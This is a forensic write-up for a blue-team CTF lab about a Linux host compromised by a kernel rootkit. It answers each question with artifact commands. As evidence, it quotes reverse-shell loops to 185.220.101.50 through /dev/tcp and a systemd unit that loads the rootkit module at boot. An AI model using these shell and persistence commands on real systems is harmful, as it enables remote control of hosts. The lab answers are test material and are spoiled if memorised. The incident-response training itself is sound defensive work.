# ContainerBreak - Rootkit Trail Lab

![image.png](image.png)

# Table of Contents

- [Context](#context)
- [Scenario](#scenario)
- [Discovery](#discovery)
- [Persistence](#persistence)

# Context

**Lab Link**: [https://cyberdefenders.org/blueteam-ctf-challenges/containerbreak-rootkit-trail/](https://cyberdefenders.org/blueteam-ctf-challenges/containerbreak-rootkit-trail/)

**Suggested Tools**: Linux command-line tools

**Tactics**: Execution, Persistence, Privilege Escalation, Defense Evasion, Command and Control

# Scenario

Following the network intrusion, the attacker successfully escaped from the container to the underlying Linux host system. After killing the packet-capture process, the attacker uploaded malicious files, installed a kernel-level rootkit, and then carefully removed installation artifacts before disconnecting.

Days later, the compromised server exhibited suspicious behavior (hidden processes, unexplained network connections, and system instability). A complete forensic collection was performed on the live system to investigate the compromise and identify the attacker’s persistence mechanisms.

# Discovery

Q1- What is the exact kernel version of the compromised Ubuntu server?

**Answer**: 5.4.0-216-generic

**Explanation**: You can confirm this by searching the artifact collection for `uname` output:

```bash
uac-wowza-linux-20251124233603 $ find . -name "*uname*"
./live_response/network/uname_-n.txt
./live_response/system/uname_-a.txt
uac-wowza-linux-20251124233603 $ cat ./live_response/system/uname_-a.txt
Linux wowza 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

Q2- What is the hostname of the compromised system?

**Answer**: `wowza`

**Explanation**: This is recorded in `/etc/hostname` (also visible in the collected filesystem artifacts):

```bash
uac-wowza-linux-20251124233603 $ find . -name "*hostname*"
./live_response/network/hostnamectl.txt
./live_response/network/hostname_-f.txt
./live_response/network/hostname.txt
./[root]/lib/systemd/system/systemd-hostnamed.service
./[root]/etc/hostname
./[root]/usr/lib/systemd/systemd-hostnamed
./[root]/usr/lib/systemd/system/systemd-hostnamed.service
uac-wowza-linux-20251124233603 $ cat ./\[root\]/etc/hostname
wowza
```

Q3- What is the current kernel taint value at the time of collection?

**Answer**: 12288

**Explanation**: The taint value is captured directly from `/proc/sys/kernel/tainted`:

```bash
uac-wowza-linux-20251124233603 $ find . -name "*tainted*"
./live_response/system/cat_proc_sys_kernel_tainted.txt
uac-wowza-linux-20251124233603 $ cat ./live_response/system/cat_proc_sys_kernel_tainted.txt
12288
```

From the taint bitmask, 12288 corresponds to 8192 + 4096, which indicates:

- `TAINT_UNSIGNED_MODULE`
- `TAINT_OOT_MODULE`

This strongly suggests a rootkit or other malicious LKM (Loadable Kernel Module) was injected into the running kernel. A good follow-up is to enumerate loaded modules (e.g., `lsmod` or `/proc/modules`) and compare them against a known-good baseline.

## Side Note: What Is the Kernel Taint Value?

In DFIR, the **kernel taint value** is a numeric bitmask maintained by the Linux kernel that indicates whether the kernel has been modified in a way that may affect its integrity, reliability, or supportability.

Each bit corresponds to a condition such as loading an out-of-tree module, loading an unsigned module, encountering a kernel oops, or forcing module loading. The current taint value can be read from `/proc/sys/kernel/tainted`.

During evidence collection, capturing this value matters because a non-zero taint value can indicate that kernel-level tampering may have occurred. Kernel tampering can also reduce trust in other artifacts collected from kernel-exposed interfaces (e.g., process listings and network connections).

![**Kernel taint values/switches**](image%201.png)

**Kernel taint values/switches**

# Persistence

Q4- A malicious kernel module was loaded on the compromised machine. What is the name of this module?

**Answer**: `sysperf`

**Explanation**: `sysperf.ko` stands out as the only kernel object (`.ko`) present in the collected modules directory, and it has several suspicious indicators:

- Suspicious author (`System`)
- Empty dependency list (`depends`)
- Missing integrity-related fields (e.g., `signer`, `sig_hashalgo`)

```bash
modules $ pwd
/home/ubuntu/Desktop/Start here/Artifacts/uac-wowza-linux-20251124233603/[root]/lib/modules
modules $ modinfo sysperf.ko
filename:       /home/ubuntu/Desktop/Start here/Artifacts/uac-wowza-linux-20251124233603/[root]/lib/modules/sysperf.ko
description:    System Performance Monitor
author:         System
license:        GPL
srcversion:     0C4E92CF9A76C56E50C9E0B
depends:
retpoline:      Y
name:           sysperf
vermagic:       5.4.0-216-generic SMP mod_unload modversions
```

Running `strings` against the module also reveals a hardcoded C2 IP address:

```bash
modules $ strings sysperf.ko
yJs.<0
Linux
6SysPerfMon: Initializing system performance monitor
6SysPerfMon: Target C2: %s:%d
6SysPerfMon: Module protection enabled
6SysPerfMon: Monitoring active
6SysPerfMon: Stopping monitor
185.220.101.50
```

Q5- At what `dmesg` timestamp was the rootkit module first loaded? (seconds.microseconds)

**Answer**: 9127.292300

**Explanation**: Filter the captured `dmesg` output for the module name:

```bash
uac-wowza-linux-20251124233603 $ grep sysperf ./live_response/hardware/dmesg.txt
[ 9127.292300] sysperf: loading out-of-tree module taints kernel.
[ 9127.293082] sysperf: module verification failed: signature and/or required key missing - tainting kernel
```

Q6- What is the absolute UTC timestamp when the rootkit was loaded? Convert the dmesg timestamp accordingly.

**Answer**: 2025-11-24 23:31

**Explanation**: Convert the `dmesg` relative timestamp by adding it to the system’s boot time (uptime offset). Example calculation:

```bash
python3 - << 'PY'
from datetime import datetime, timedelta, timezone
boot = datetime.strptime("2025-11-24 20:59:29", "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
offset = 9127.292300
print(boot + timedelta(seconds=offset))
PY
2025-11-24 23:31:36.292300+00:00
```

Q7- What C2 server IP address and port are configured in the rootkit?

**Answer**: 185.220.101.50:9999

**Explanation**: Evidence appears in the Volatility `pstree` artifacts. The IP matches the hardcoded string from the kernel module, and the loop indicates persistence (reconnect every 30 seconds):

```bash
process $ cat pstree_-a.txt | grep "185.220.101.50"
  |-bash -c while true; do bash -i >& /dev/tcp/185.220.101.50/9999 0>&1; sleep 30; done
  |   |       |-bash -c bash -i >& /dev/tcp/185.220.101.50/4444 0>&1
```

Q8- The threat actor created a systemd service to maintain persistence on the compromised machine. What is the full path to this service file?

**Answer**: `/etc/systemd/system/sysperf.service`

**Explanation**: Search the collected filesystem for service files and filter for `sysperf`:

```bash
uac-wowza-linux-20251124233603 $ find . -name "*.service*" | grep sysperf
./[root]/etc/systemd/system/sysperf.service
```

Q9- The systemd service file specifies a command to run upon startup. What is the exact command configured in this service file?

**Answer**: `/sbin/insmod /lib/modules/sysperf.ko`

**Explanation**: The command is defined in the service’s `ExecStart` directive:

```bash
uac-wowza-linux-20251124233603 $ cat ./\[root\]/etc/systemd/system/sysperf.service
[Unit]
Description=System Performance Monitoring Service
After=network.target
DefaultDependencies=no

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/sysperf.ko # insmod manually inserts a kernel module
RemainAfterExit=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

Q10- The systemd service persistence results in a root-owned process that maintains a reverse shell loop. What is the PID of this process?

**Answer**: 39303

**Explanation**: The process listing includes a root-owned `bash` loop connecting to the C2 address:

```bash
process $ grep while . -r
./ps_auxwww.txt:root       39303  0.0  0.0   6892  3160 ?        S    23:31   0:00 bash -c while true; do bash -i >& /dev/tcp/185.220.101.50/9999 0>&1; sleep 30; done
```

Q11- The rootkit maintains persistence through a reverse shell connection. What is the full command line of this persistent reverse shell?

**Answer**: `while true; do bash -i >& /dev/tcp/185.220.101.50/9999 0>&1; sleep 30; done`

**Explanation**: This is the exact command line shown in the process listing in Q10.

Q12- What is the SHA256 hash of the rootkit kernel module?

**Answer**: ded20890c28460708ea1f02ef50b6e3b44948dbe67d590cc6ff2285241353fd8

**Explanation**: Compute the SHA256 digest of `sysperf.ko` (e.g., `sha256sum sysperf.ko`) and record the output.
